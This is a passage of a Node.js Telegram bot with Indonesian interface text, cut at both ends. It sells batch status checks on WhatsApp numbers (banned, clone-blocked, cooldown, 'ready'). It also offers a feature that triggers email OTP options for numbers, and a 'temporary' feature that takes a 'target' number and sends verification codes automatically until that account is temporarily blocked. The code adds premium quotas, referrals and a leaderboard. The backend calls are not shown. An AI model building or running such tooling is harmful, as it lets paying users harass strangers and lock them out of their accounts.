      errors.push({ phone: r.phone || fb, error: r.error || "ɢᴀɢᴀʟ" });
      return;
    }
    const st = r.state || "UNKNOWN";
    if (st === "ERROR" || st === "INVALID_NUMBER" || st === "UNKNOWN") {
      errors.push({ phone: r.phone || fb, error: r.description || st });
      return;
    }
    if (isDeviceOn(r)) devOn++;
    else devOff++;

    if (r.isBanned || st === "BANNED") {
      banned.push(r);
      return;
    }
    if (r.isCloneBlocked || st === "CLONE_BLOCKED") {
      clone.push(r);
      return;
    }
    if (r.isInUse || st === "IN_USE") {
      inUse.push(r);
      return;
    }
    // Semua jeda (termasuk ~5m) masuk cooldown keras — sulit diverifikasi
    if (r.isCooldown || r.isSmsLimited || st === "COOLDOWN" || st === "SMS_LIMIT" || Number(r.cooldownSeconds || 0) > 0) {
      cooldown.push(r);
      return;
    }
    if (r.isReady || st === "READY") {
      ready.push(r);
      return;
    }
    errors.push({ phone: r.phone || fb, error: `ꜱᴛᴀᴛᴇ=${st}` });
  });

  const summaryLines = [
    "✦ ᴘᴇᴍᴇʀɪᴋꜱᴀᴀɴ ꜱᴇʟᴇꜱᴀɪ",
    "",
    `<blockquote>◈ ${bar(100)} 100%`,
    `⟡ ᴘʀᴏɢʀᴇꜱ ⦂ ${numbers.length} / ${numbers.length} ɴᴏᴍᴏʀ`,
    "",
    `✧ ꜱɪᴀᴘ ⦂ ${ready.length}`,
    `◐ ᴄᴏᴏʟᴅᴏᴡɴ ⦂ ${cooldown.length}`,
    `↻ ꜱᴇᴅᴀɴɢ ᴅɪᴠᴇʀɪꜰɪᴋᴀꜱɪ ⦂ ${inUse.length}`,
    `△ ᴄʟᴏɴᴇ ⦂ ${clone.length}`,
    `✕ ʙᴀɴɴᴇᴅ ⦂ ${banned.length}`,
    "",
    `● ᴏɴ-ᴅᴇᴠɪᴄᴇ ⦂ ${devOn}`,
    `○ ᴏꜰꜰ-ᴅᴇᴠɪᴄᴇ ⦂ ${devOff}`
  ];
  if (errors.length) summaryLines.push(`⚠ ɢᴀɢᴀʟ ⦂ ${errors.length}`);
  summaryLines[summaryLines.length - 1] += "</blockquote>";
  summaryLines.push("");
  summaryLines.push("⌖ ʜᴀꜱɪʟ ᴅᴇᴛᴇᴋꜱɪ");

  const blocks = [summaryLines.join("\n")];

  if (ready.length) {
    const items = ready.map(r => `⟢ <code>${esc(r.phone)}</code>\n   └ ꜱɪᴀᴘ · ${deviceBadge(r)}`);
    blocks.push(`✧ ꜱɪᴀᴘ ᴅɪᴠᴇʀɪꜰɪᴋᴀꜱɪ\n<blockquote>${items.join("\n")}</blockquote>`);
  }
  if (cooldown.length) {
    const items = cooldown.map(r => `⟢ <code>${esc(r.phone)}</code>\n   └ ${displayCD(r)} · ${deviceBadge(r)}`);
    blocks.push(`◐ ᴄᴏᴏʟᴅᴏᴡɴ\n<blockquote>${items.join("\n")}</blockquote>`);
  }
  if (inUse.length) {
    const items = inUse.map(r => `⟢ <code>${esc(r.phone)}</code>\n   └ ꜱᴇᴅᴀɴɢ ᴅɪᴠᴇʀɪꜰɪᴋᴀꜱɪ · ${deviceBadge(r)}`);
    blocks.push(`↻ ꜱᴇᴅᴀɴɢ ᴅɪᴠᴇʀɪꜰɪᴋᴀꜱɪ\n<blockquote>${items.join("\n")}</blockquote>`);
  }
  if (clone.length) {
    const items = clone.map(r => `⟢ <code>${esc(r.phone)}</code>\n   └ ${cloneStatusLabel(r)} · ${deviceBadge(r)}`);
    blocks.push(`△ ᴛɪᴅᴀᴋ ꜱᴜᴘᴘᴏʀᴛ ᴄʟᴏɴᴇ\n<blockquote>${items.join("\n")}</blockquote>`);
  }
  if (banned.length) {
    const items = banned.map(r => `⟢ <code>${esc(r.phone)}</code>\n   └ ${deviceBadge(r)}`);
    blocks.push(`✕ ᴅɪʙᴀᴛᴀꜱɪ\n<blockquote>${items.join("\n")}</blockquote>`);
  }
  if (errors.length) {
    const items = errors.map(e => `⟢ <code>${esc(e.phone)}</code>\n   └ ${esc(e.error)}`);
    blocks.push(`⚠ ɢᴀɢᴀʟ\n<blockquote>${items.join("\n")}</blockquote>`);
  }

  if (elapsedSec !== null) {
    blocks.push(
    "────────────────────\n" +
    `◈ ᴡᴀᴋᴛᴜ  ·  <code>${formatElapsed(elapsedSec)}</code>`
  );
  }

  return {
    chunks: splitBlocksIntoChunks(blocks, 3800),
    readyCount: ready.length
  };
}

function buildEmailOutput(numbers, results, elapsedSec = null) {
  const eligible = [], wait = [], unavailable = [], banned = [], errors = [];
  let devOn = 0, devOff = 0;

  results.forEach((r, i) => {
    const fb = numbers[i];
    if (!r) {
      errors.push({ phone: fb, error: "no response" });
      return;
    }
    if (!r.success) {
      errors.push({ phone: r.phone || fb, error: r.error || "gagal" });
      return;
    }
    if (isDeviceOn(r)) devOn++;
    else devOff++;

    if (r.emailStatus === "BANNED") { banned.push(r); return; }
    if (r.emailStatus === "WAIT") { wait.push(r); return; }
    if (r.emailStatus === "ELIGIBLE") { eligible.push(r); return; }
    unavailable.push(r);
  });

  const summary = [
    `Total        : ${numbers.length}`,
    `Sudah muncul : ${eligible.length}`,
    `Belum muncul : ${unavailable.length}`
  ];
  if (wait.length) summary.push(`Masih jeda   : ${wait.length}`);
  if (banned.length) summary.push(`Dibatasi     : ${banned.length}`);
  if (errors.length) summary.push(`Gagal cek    : ${errors.length}`);
  summary.push(`On-device    : ${devOn}`);
  summary.push(`Off-device   : ${devOff}`);

  const blocks = [
    [
      "✧ Hasil Cek Email",
      "",
      `<blockquote>${summary.join("\n")}</blockquote>`
    ].join("\n")
  ];

  if (eligible.length) {
    const items = eligible.map((r, idx) => {
      const mail = r.maskedEmail ? `<code>${esc(r.maskedEmail)}</code>` : "tersedia";
      return [
        `<b>${idx + 1}.</b> <code>${esc(r.phone)}</code>`,
        `   Email     : ${mail}`,
        `   Perangkat : ${deviceBadge(r)}`
      ].join("\n");
    });
    blocks.push(
      "✦ Email sudah muncul\n" +
      `<blockquote>${items.join("\n\n")}</blockquote>\n` +
      "ⓘ Buka WA → <b>Tidak menerima kode?</b> → <b>Kirim email</b>\n" +
      "   Email di atas bisa dipakai untuk terima kode OTP."
    );
  }

  if (wait.length) {
    const items = wait.map((r, idx) => {
      const cd = formatCooldown(r.emailWaitSeconds || 0);
      return [
        `<b>${idx + 1}.</b> <code>${esc(r.phone)}</code>`,
        `   Status    : jeda ${cd}`,
        `   Perangkat : ${deviceBadge(r)}`
      ].join("\n");
    });
    blocks.push(
      "◐ Masih dalam jeda\n" +
      `<blockquote>${items.join("\n\n")}</blockquote>\n` +
      "ⓘ Tunggu jeda selesai, lalu cek ulang."
    );
  }

  if (unavailable.length) {
    const items = unavailable.map((r, idx) => {
      return [
        `<b>${idx + 1}.</b> <code>${esc(r.phone)}</code>`,
        `   Status    : belum tersedia`,
        `   Perangkat : ${deviceBadge(r)}`
      ].join("\n");
    });
    blocks.push(
      "○ Email belum muncul\n" +
      `<blockquote>${items.join("\n\n")}</blockquote>\n` +
      "ⓘ Email hanya muncul di WA resmi + perangkat terverifikasi.\n" +
      "   Tap <b>ⓘ Panduan</b> untuk langkah memunculkan."
    );
  }

  if (banned.length) {
    const items = banned.map((r, idx) => {
      return [
        `<b>${idx + 1}.</b> <code>${esc(r.phone)}</code>`,
        `   Status    : dibatasi / ban`,
        `   Perangkat : ${deviceBadge(r)}`
      ].join("\n");
    });
    blocks.push(
      "✕ Akun dibatasi\n" +
      `<blockquote>${items.join("\n\n")}</blockquote>\n` +
      "ⓘ Nomor tidak bisa menerima kode verifikasi saat ini."
    );
  }

  if (errors.length) {
    const items = errors.map((e, idx) => {
      return [
        `<b>${idx + 1}.</b> <code>${esc(e.phone)}</code>`,
        `   Error     : ${esc(e.error)}`
      ].join("\n");
    });
    blocks.push(
      "⚠ Gagal dicek\n" +
      `<blockquote>${items.join("\n\n")}</blockquote>\n` +
      "ⓘ Coba cek ulang beberapa saat lagi."
    );
  }

  if (elapsedSec !== null) {
    blocks.push(`────────────────────\nWaktu  ·  <code>${formatElapsed(elapsedSec)}</code>`);
  }

  return {
    chunks: splitBlocksIntoChunks(blocks, 3800)
  };
}

function buildResultKeyboard(batchId) {
  return inlineKb([
    [
      btn("↻ ᴜᴘᴅᴀᴛᴇ", `det_upd_${batchId}`, "primary"),
      btn("ⓘ ɪɴꜰᴏ", `det_info_${batchId}`, "primary")
    ],
    [btn("◂ ᴋᴇᴍʙᴀʟɪ", "nav_home", "primary")]
  ]);
}

function buildEmailResultKeyboard(batchId) {
  return inlineKb([
    [
      btn("↻ ᴜʟᴀɴɢ", `eml_upd_${batchId}`, "success"),
      btn("ⓘ ᴘᴀɴᴅᴜᴀɴ", `eml_info_${batchId}`, "primary")
    ],
    [btn("◂ ᴋᴇᴍʙᴀʟɪ", "nav_home", "primary")]
  ]);
}

async function processNumbers(ctx, rawInput) {
  const userId = ctx.from.id;
  await ensureUser(userId, ctx.from);
  await clearInlinePanel(ctx, userId);
  const numbers = extractSmartPhoneNumbers(rawInput);

  if (numbers.length === 0) {
    awaitingInput.add(userId);
    return showInlinePanel(ctx, [
      "△ ᴛɪᴅᴀᴋ ᴀᴅᴀ ɴᴏᴍᴏʀ ᴠᴀʟɪᴅ",
      "",
      "<blockquote>⟡ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ ɴᴏᴍᴏʀ ᴛᴇʟᴇᴘᴏɴ ʏᴀɴɢ ᴠᴀʟɪᴅ ᴅᴀʟᴀᴍ ᴘᴇꜱᴀɴ ᴀɴᴅᴀ.",
      "⊹ ᴋɪʀɪᴍ ɴᴏᴍᴏʀ ᴛᴀʀɢᴇᴛ (ᴄᴏɴᴛᴏʜ ⦂ +6281234567890) ᴀᴛᴀᴜ ᴋʟɪᴋ ʙᴀᴛᴀʟᴋᴀɴ.</blockquote>"
    ].join("\n"), inlineKb([[btn("✕ ʙᴀᴛᴀʟᴋᴀɴ", "cancel_detect", "danger")]]), false);
  }

  const premium = await isPremiumUser(userId);
  const used = await getUsed(userId);

  if (premium) {
    if (numbers.length > PREMIUM_BATCH_LIMIT) {
      return ctx.reply(`⚠ ᴍᴀᴋꜱɪᴍᴀʟ ${PREMIUM_BATCH_LIMIT} ɴᴏᴍᴏʀ ᴘᴇʀ ᴘᴇᴍᴇʀɪᴋꜱᴀᴀɴ ᴜɴᴛᴜᴋ ᴘʀᴇᴍɪᴜᴍ`, mainKeyboard(userId));
    }
  } else {
    const remaining = FREE_DAILY_LIMIT - used;
    if (remaining <= 0) return ctx.reply(`⚠ ᴋᴜᴏᴛᴀ ʜᴀʀɪᴀɴ ᴀɴᴅᴀ (${FREE_DAILY_LIMIT} ɴᴏᴍᴏʀ) ʜᴀʙɪꜱ`, mainKeyboard(userId));
    if (numbers.length > remaining) {
      return ctx.reply(`⚠ ꜱɪꜱᴀ ᴋᴜᴏᴛᴀ ʜᴀʀɪ ɪɴɪ ⦂ ${remaining} ɴᴏᴍᴏʀ\n⚠ ᴀɴᴅᴀ ᴍᴇɴɢɪʀɪᴍ ${numbers.length} ɴᴏᴍᴏʀ`, mainKeyboard(userId));
    }
  }

  const startedAt = Date.now();
  const statusMsg = await ctx.reply(summarizeProgress([], numbers.length), { parse_mode: "HTML" });

  let lastEdit = 0;
  const minInterval = numbers.length <= 5 ? 280 : 600;
  const results = await checkAll(numbers, async (done, total, partialResults) => {
    const now = Date.now();
    if (now - lastEdit < minInterval && done < total) return;
    lastEdit = now;
    await safeEditMessage(
      ctx.telegram,
      ctx.chat.id,
      statusMsg.message_id,
      summarizeProgress(partialResults, total),
      null
    );
  }, { forceFresh: false });

  if (!premium) await addUsed(userId, numbers.length);

  const elapsedSec = ((Date.now() - startedAt) / 1000).toFixed(1);
  const output = buildDetectionOutput(numbers, results, elapsedSec);

  await incrUserField(userId, "total_detections", numbers.length);
  if (output.readyCount > 0) {
    await incrUserField(userId, "ready_detections", output.readyCount);
    await redis.zincrby("leaderboard:ready", output.readyCount, String(userId));
  }
  await activateReferral(userId);

  const batchId = crypto.randomBytes(5).toString("hex");
  const resKb = buildResultKeyboard(batchId);
  await redis.set(`detect:batch:${batchId}`, JSON.stringify({
    userId,
    numbers,
    lastChunks: output.chunks
  }), { ex: 86400 });

  const chunks = output.chunks;

  if (chunks.length === 1) {
    try {
      await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, chunks[0], {
        parse_mode: "HTML",
        ...resKb
      });
    } catch (_) {
      await ctx.reply(chunks[0], { parse_mode: "HTML", ...resKb });
    }
  } else {
    try {
      await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, chunks[0], {
        parse_mode: "HTML"
      });
    } catch (_) {
      await ctx.reply(chunks[0], { parse_mode: "HTML" });
    }
    for (let i = 1; i < chunks.length; i++) {
      const isLast = i === chunks.length - 1;
      try {
        await ctx.reply(chunks[i], {
          parse_mode: "HTML",
          ...(isLast ? resKb : {})
        });
      } catch (_) {}
    }
  }
}

async function processEmailFix(ctx, rawInput) {
  const userId = ctx.from.id;
  await ensureUser(userId, ctx.from);
  await clearInlinePanel(ctx, userId);
  const numbers = extractSmartPhoneNumbers(rawInput);

  if (numbers.length === 0) {
    awaitingEmailInput.add(userId);
    return showInlinePanel(ctx, [
      "△ ꜰᴏʀᴍᴀᴛ ɴᴏᴍᴏʀ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ",
      "",
      "<blockquote>▸ ᴘᴀꜱᴛɪᴋᴀɴ ɴᴏᴍᴏʀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴋᴏᴅᴇ ɴᴇɢᴀʀᴀ (ᴄᴏɴᴛᴏʜ ⦂ <code>+6281234567890</code>).",
      "▸ ᴋɪʀɪᴍ ᴜʟᴀɴɢ ɴᴏᴍᴏʀ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪᴘᴇʀɪᴋsᴀ ᴏᴘsɪ ᴇᴍᴀɪʟɴʏᴀ.</blockquote>"
    ].join("\n"), inlineKb([[btn("✕ ʙᴀᴛᴀʟᴋᴀɴ", "cancel_email", "danger")]]), false);
  }

  const access = await assertFeatureAccess(userId, "email");
  if (!access.ok) {
    return ctx.reply(`⚠ ᴋᴜᴏᴛᴀ ᴍᴜɴᴄᴜʟᴋᴀɴ ᴇᴍᴀɪʟ ɢʀᴀᴛɪꜱ ʜᴀʀɪ ɪɴɪ ʜᴀʙɪꜱ (${FREE_FEATURE_LIMIT}x). ᴜᴘɢʀᴀᴅᴇ ᴘʀᴇᴍɪᴜᴍ ᴜɴᴛᴜᴋ ʟᴀɴᴊᴜᴛ.`, mainKeyboard(userId));
  }
  const premium = access.premium;
  if (premium) {
    if (numbers.length > PREMIUM_BATCH_LIMIT) {
      return ctx.reply(`⚠ ᴍᴀᴋꜱɪᴍᴀʟ ${PREMIUM_BATCH_LIMIT} ɴᴏᴍᴏʀ ᴘᴇʀ ᴘᴇᴍᴇʀɪᴋꜱᴀᴀɴ ᴜɴᴛᴜᴋ ᴘʀᴇᴍɪᴜᴍ`, mainKeyboard(userId));
    }
  } else {
    if (numbers.length > access.remaining) {
      return ctx.reply(`⚠ ꜱɪꜱᴀ ᴋᴜᴏᴛᴀ ᴇᴍᴀɪʟ ʜᴀʀɪ ɪɴɪ ⦂ ${access.remaining}
⚠ ᴀɴᴅᴀ ᴍᴇɴɢɪʀɪᴍ ${numbers.length} ɴᴏᴍᴏʀ`, mainKeyboard(userId));
    }
    await addFeatureUsed(userId, "email", numbers.length);
  }

  const startedAt = Date.now();
  const statusMsg = await ctx.reply(summarizeEmailProgress([], numbers.length), { parse_mode: "HTML" });

  let lastEdit = 0;
  const minInterval = numbers.length <= 5 ? 280 : 600;
  const results = await triggerEmailAll(numbers, async (done, total, partialResults) => {
    const now = Date.now();
    if (now - lastEdit < minInterval && done < total) return;
    lastEdit = now;
    await safeEditMessage(
      ctx.telegram,
      ctx.chat.id,
      statusMsg.message_id,
      summarizeEmailProgress(partialResults, total),
      null
    );
  });

  const elapsedSec = ((Date.now() - startedAt) / 1000).toFixed(1);
  const output = buildEmailOutput(numbers, results, elapsedSec);

  await incrUserField(userId, "email_triggers", numbers.length);
  await activateReferral(userId);

  const batchId = crypto.randomBytes(5).toString("hex");
  const resKb = buildEmailResultKeyboard(batchId);
  await redis.set(`email:batch:${batchId}`, JSON.stringify({
    userId,
    numbers,
    lastChunks: output.chunks
  }), { ex: 86400 });

  const chunks = output.chunks;

  if (chunks.length === 1) {
    try {
      await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, chunks[0], {
        parse_mode: "HTML",
        ...resKb
      });
    } catch (_) {
      await ctx.reply(chunks[0], { parse_mode: "HTML", ...resKb });
    }
  } else {
    try {
      await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, chunks[0], {
        parse_mode: "HTML"
      });
    } catch (_) {
      await ctx.reply(chunks[0], { parse_mode: "HTML" });
    }
    for (let i = 1; i < chunks.length; i++) {
      const isLast = i === chunks.length - 1;
      try {
        await ctx.reply(chunks[i], {
          parse_mode: "HTML",
          ...(isLast ? resKb : {})
        });
      } catch (_) {}
    }
  }
}

async function runBroadcast(ctx, sourceMsg) {
  const userId = ctx.from.id;
  await clearInlinePanel(ctx, userId);
  const userIds = await getAllUserIds();
  if (userIds.length === 0) {
    return ctx.reply("⚠ ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴜꜱᴇʀ ᴛᴇʀᴅᴀꜰᴛᴀʀ ᴜɴᴛᴜᴋ ʙʀᴏᴀᴅᴄᴀꜱᴛ", mainKeyboard(userId));
  }
  const progMsg = await ctx.reply([
    "⌲ ᴍᴇɴɢɪʀɪᴍ ʙʀᴏᴀᴅᴄᴀꜱᴛ",
    "",
    `<blockquote>◈ ᴛᴀʀɢᴇᴛ ⦂ ${userIds.length} ᴘᴇɴɢɢᴜɴᴀ`,
    `⟡ ꜱᴛᴀᴛᴜꜱ ⦂ ᴍᴇᴍᴘʀᴏꜱᴇꜱ...</blockquote>`
  ].join("\n"), { parse_mode: "HTML" });

  let sent = 0;
  let failed = 0;
  for (let i = 0; i < userIds.length; i++) {
    const uid = Number(userIds[i]);
    try {
      await ctx.telegram.copyMessage(uid, ctx.chat.id, sourceMsg.message_id);
      sent++;
    } catch (_) {
      failed++;
    }
    if ((i + 1) % 25 === 0 && i + 1 < userIds.length) {
      const pct = Math.round((i + 1) * 100 / userIds.length);
      try {
        await ctx.telegram.editMessageText(ctx.chat.id, progMsg.message_id, undefined, [
          "⌲ ᴍᴇɴɢɪʀɪᴍ ʙʀᴏᴀᴅᴄᴀꜱᴛ",
          "",
          `<blockquote>◈ ${bar(pct)} ${pct}%`,
          `✓ ᴛᴇʀᴋɪʀɪᴍ ⦂ ${sent} · ✕ ɢᴀɢᴀʟ ⦂ ${failed}</blockquote>`
        ].join("\n"), { parse_mode: "HTML" });
      } catch (_) {}
    }
    await new Promise(r => setTimeout(r, 40));
  }

  const finalReport = [
    "✦ ʙʀᴏᴀᴅᴄᴀꜱᴛ ꜱᴇʟᴇꜱᴀɪ",
    "",
    `<blockquote>◈ ᴛᴏᴛᴀʟ ᴛᴀʀɢᴇᴛ ⦂ ${userIds.length} ᴜꜱᴇʀ`,
    `✓ ʙᴇʀʜᴀꜱɪʟ ⦂ ${sent}`,
    `✕ ɢᴀɢᴀʟ ⦂ ${failed}</blockquote>`
  ].join("\n");

  try {
    await ctx.telegram.editMessageText(ctx.chat.id, progMsg.message_id, undefined, finalReport, {
      parse_mode: "HTML",
      ...inlineKb([[btn("⟢ ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴘᴀɴᴇʟ", "admin", "primary")]])
    });
    activeInlineMsg.set(userId, { chatId: ctx.chat.id, messageId: progMsg.message_id });
  } catch (_) {
    await ctx.reply(finalReport, { parse_mode: "HTML", ...mainKeyboard(userId) });
  }
}

async function migrateFromSQLite() {
  if (!fs.existsSync("bot.db")) return;
  try {
    const SQLite = require("better-sqlite3");
    const old = new SQLite("bot.db", { readonly: true });
    const users = old.prepare("SELECT * FROM users").all();
    const payments = old.prepare("SELECT * FROM payments").all();
    const refs = old.prepare("SELECT * FROM referrals").all();
    const usage = old.prepare("SELECT * FROM usage").all();
    old.close();
    for (const u of users) {
      await redis.sadd("users:all", String(u.user_id));
      const key = `user:${u.user_id}`;
      if (await redis.exists(key)) continue;
      const fields = {};
      for (const [k, v] of Object.entries(u)) {
        if (v === null || v === undefined) continue;
        fields[k] = String(v);
      }
      fields.ready_detections = fields.ready_detections || "0";
      fields.email_triggers = fields.email_triggers || "0";
      await redis.hset(key, fields);
      if (u.premium_until) {
        await redis.set(`user:premium_until:${u.user_id}`, String(u.premium_until));
      }
    }
    for (const p of payments) {
      await redis.hset(`payment:${p.id}`, {
        id: String(p.id),
        user_id: String(p.user_id),
        plan_days: String(p.plan_days),
        plan_price: String(p.plan_price),
        invoice_id: String(p.invoice_id),
        status: String(p.status || "pending"),
        proof_file_id: p.proof_file_id || "",
        created_at: String(p.created_at || ""),
        approved_at: p.approved_at || ""
      });
      await redis.set(`payment:invoice:${p.invoice_id}`, String(p.id));
      if (p.status === "pending" || p.status === "review") await redis.sadd("payments:pending", String(p.id));
      const curNext = await redis.get("payment:next_id");
      const next = parseInt(p.id, 10) + 1;
      if (!curNext || parseInt(curNext, 10) < next) await redis.set("payment:next_id", String(next));
    }
    for (const r of refs) {
      await redis.set(`referral:by:${r.referred_id}`, String(r.referrer_id));
      await redis.hset(`referral:${r.referred_id}`, {
        referrer_id: String(r.referrer_id),
        status: r.status || "pending",
        created_at: String(r.created_at || ""),
        activated_at: r.activated_at || ""
      });
      if (r.status === "active") {
        await redis.sadd(`referrals:${r.referrer_id}`, String(r.referred_id));
        await redis.sadd(`referrals:active:${r.referrer_id}`, String(r.referred_id));
      }
    }
    for (const u of usage) {
      await redis.set(`usage:${u.user_id}:${u.date}`, String(u.count), { ex: 172800 });
    }
    fs.renameSync("bot.db", "bot.db.migrated");
    console.log("✔ migrasi ꜱQʟɪᴛᴇ → ʀᴇᴅɪꜱ ꜱᴇʟᴇꜱᴀɪ");
  } catch (e) {
    console.error("migrasi gagal:", e.message);
  }
}

const bot = new Telegraf(BOT_TOKEN);

bot.start(async (ctx) => {
  const userId = ctx.from.id;
  const existed = await getUser(userId);
  await ensureUser(userId, ctx.from);
  if (!existed) {
    const payload = ctx.startPayload || "";
    if (payload.startsWith("ref_")) {
      const referrerId = parseInt(payload.slice(4), 10);
      if (referrerId) await recordReferral(referrerId, userId);
    }
  }
  awaitingInput.delete(userId);
  awaitingEmailInput.delete(userId);
  adminState.delete(userId);
  await sendFreshKeyboardPanel(ctx, await buildDashboard(userId, ctx.from));
});

bot.hears(MENU_LABELS.DETECT, async (ctx) => {
  const userId = ctx.from.id;
  awaitingEmailInput.delete(userId);
  awaitingSendInput.delete(userId);
  adminState.delete(userId);
  awaitingInput.add(userId);
  await showInlinePanel(
    ctx,
    await buildDetectPrompt(userId, ctx.from),
    inlineKb([[btn("✕ ʙᴀᴛᴀʟᴋᴀɴ", "cancel_detect", "danger")]]),
    true
  );
});

bot.hears(MENU_LABELS.EMAIL_FIX, async (ctx) => {
  const userId = ctx.from.id;
  awaitingInput.delete(userId);
  awaitingSendInput.delete(userId);
  adminState.delete(userId);
  const access = await assertFeatureAccess(userId, "email");
  if (!access.ok) {
    return showInlinePanel(ctx, [
      "✦ ᴍᴜɴᴄᴜʟᴋᴀɴ ᴇᴍᴀɪʟ",
      "",
      `<blockquote>▸ ᴋᴜᴏᴛᴀ ɢʀᴀᴛɪꜱ ʜᴀʀɪ ɪɴɪ ʜᴀʙɪꜱ (${FREE_FEATURE_LIMIT}x).`,
      "▸ ᴜᴘɢʀᴀᴅᴇ ᴘʀᴇᴍɪᴜᴍ ᴜɴᴛᴜᴋ ᴀᴋꜱᴇꜱ ᴛᴀɴᴘᴀ ʙᴀᴛᴀꜱ.</blockquote>"
    ].join("\n"), inlineKb([
      [btn("♛ ᴘʀᴇᴍɪᴜᴍ", "premium_back", "success")],
      [btn("✕ ᴛᴜᴛᴜᴘ", "cancel_email", "danger")]
    ]), true);
  }
  awaitingEmailInput.add(userId);
  await showInlinePanel(
    ctx,
    await buildEmailPrompt(userId, ctx.from),
    inlineKb([[btn("✕ ʙᴀᴛᴀʟ", "cancel_email", "danger")]]),
    true
  );
});

bot.hears(MENU_LABELS.SEND_CODE, async (ctx) => {
  const userId = ctx.from.id;
  awaitingInput.delete(userId);
  awaitingEmailInput.delete(userId);
  adminState.delete(userId);
  const access = await assertFeatureAccess(userId, "temporary");
  if (!access.ok) {
    return showInlinePanel(ctx, [
      "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ",
      "",
      `<blockquote>▸ ᴋᴜᴏᴛᴀ ɢʀᴀᴛɪꜱ ʜᴀʀɪ ɪɴɪ ʜᴀʙɪꜱ (${FREE_FEATURE_LIMIT}x).`,
      "▸ ᴜᴘɢʀᴀᴅᴇ ᴘʀᴇᴍɪᴜᴍ ᴜɴᴛᴜᴋ ᴀᴋꜱᴇꜱ ᴛᴀɴᴘᴀ ʙᴀᴛᴀꜱ.</blockquote>"
    ].join("\n"), inlineKb([
      [btn("♛ ᴘʀᴇᴍɪᴜᴍ", "premium_back", "success")],
      [btn("✕ ᴛᴜᴛᴜᴘ", "cancel_send", "danger")]
    ]), true);
  }
  awaitingSendInput.add(userId);
  const quotaLine = access.premium
    ? "▸ ᴀᴋꜱᴇꜱ ⦂ ᴘʀᴇᴍɪᴜᴍ (ᴜɴʟɪᴍɪᴛᴇᴅ)"
    : `▸ ꜱɪꜱᴀ ᴋᴜᴏᴛᴀ ɢʀᴀᴛɪꜱ ⦂ ${access.remaining}/${FREE_FEATURE_LIMIT}`;
  await showInlinePanel(
    ctx,
    [
      "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ",
      "",
      "<blockquote>⟡ ᴋɪʀɪᴍ <b>1 ɴᴏᴍᴏʀ</b> ᴛᴀʀɢᴇᴛ.",
      "⊹ ʙᴏᴛ ᴄᴇᴋ ꜱᴛᴀᴛᴜꜱ + ᴍᴇᴛᴏᴅᴇ ʏᴀɴɢ ᴛᴇʀꜱᴇᴅɪᴀ.",
      "⊹ ᴘɪʟɪʜ ᴍᴇᴛᴏᴅᴇ → ᴋɪʀɪᴍ ᴏᴛᴏᴍᴀᴛɪꜱ ꜱᴀᴍᴘᴀɪ ᴛᴇᴍᴘᴏʀᴀʀʏ.",
      quotaLine + "</blockquote>"
    ].join("\n"),
    inlineKb([[btn("✕ ʙᴀᴛᴀʟ", "cancel_send", "danger")]]),
    true
  );
});

bot.hears(MENU_LABELS.STATUS, async (ctx) => {
  const userId = ctx.from.id;
  awaitingInput.delete(userId);
  awaitingEmailInput.delete(userId);
  awaitingSendInput.delete(userId);
  adminState.delete(userId);
  await showPlainPanel(ctx, await buildStatusPage(userId, ctx.from), true);
});

bot.hears(MENU_LABELS.REFERRAL, async (ctx) => {
  const userId = ctx.from.id;
  awaitingInput.delete(userId);
  awaitingEmailInput.delete(userId);
  adminState.delete(userId);
  await ensureUser(userId, ctx.from);
  await showInlinePanel(ctx, await buildReferralPage(userId), buildReferralKeyboard(userId), true);
});

bot.hears(MENU_LABELS.PREMIUM, async (ctx) => {
  const userId = ctx.from.id;
  awaitingInput.delete(userId);
  awaitingEmailInput.delete(userId);
  adminState.delete(userId);
  await ensureUser(userId, ctx.from);
  await showInlinePanel(ctx, buildPremiumPage(), buildPremiumKeyboard(), true);
});

bot.hears(MENU_LABELS.LEADERBOARD, async (ctx) => {
  const userId = ctx.from.id;
  awaitingInput.delete(userId);
  awaitingEmailInput.delete(userId);
  adminState.delete(userId);
  await ensureUser(userId, ctx.from);
  await showPlainPanel(ctx, await buildLeaderboardPage(userId), true);
});

bot.hears(MENU_LABELS.ADMIN, async (ctx) => {
  const userId = ctx.from.id;
  if (!ADMIN_IDS.includes(userId)) return;
  awaitingInput.delete(userId);
  awaitingEmailInput.delete(userId);
  adminState.delete(userId);
  const text = await buildAdminPanel(userId);
  await showInlinePanel(ctx, text, buildAdminKeyboard(), true);
});

bot.action(/^det_info_([a-f0-9]+)$/i, async (ctx) => {
  const batchId = ctx.match[1];
  await safeAnswerCb(ctx);
  try {
    await ctx.editMessageText(buildDetectInfoPage(), {
      parse_mode: "HTML",
      ...inlineKb([
        [
          btn("⟢ ᴋᴇᴍʙᴀʟɪ ᴋᴇ ʜᴀꜱɪʟ", `det_back_${batchId}`, "primary"),
          btn("↻ ᴜᴘᴅᴀᴛᴇ", `det_upd_${batchId}`, "success")
        ]
      ])
    });
  } catch (_) {}
});

bot.action(/^det_back_([a-f0-9]+)$/i, async (ctx) => {
  const batchId = ctx.match[1];
  const raw = await redis.get(`detect:batch:${batchId}`);
  if (!raw) return safeAnswerCb(ctx, "ᴅᴀᴛᴀ ʜᴀꜱɪʟ ꜱᴜᴅᴀʜ ᴋᴀᴅᴀʟᴜᴡᴀʀꜱᴀ", { show_alert: true });
  let data;
  try { data = typeof raw === "string" ? JSON.parse(raw) : raw; } catch (_) { data = null; }
  if (!data || !Array.isArray(data.lastChunks) || data.lastChunks.length === 0) {
    return safeAnswerCb(ctx, "ᴅᴀᴛᴀ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ", { show_alert: true });
  }
  await safeAnswerCb(ctx);
  const lastChunk = data.lastChunks[data.lastChunks.length - 1];
  try {
    await ctx.editMessageText(lastChunk, {
      parse_mode: "HTML",
      ...buildResultKeyboard(batchId)
    });
  } catch (_) {}
});

bot.action(/^det_upd_([a-f0-9]+)$/i, async (ctx) => {
  const batchId = ctx.match[1];
  const userId = ctx.from.id;
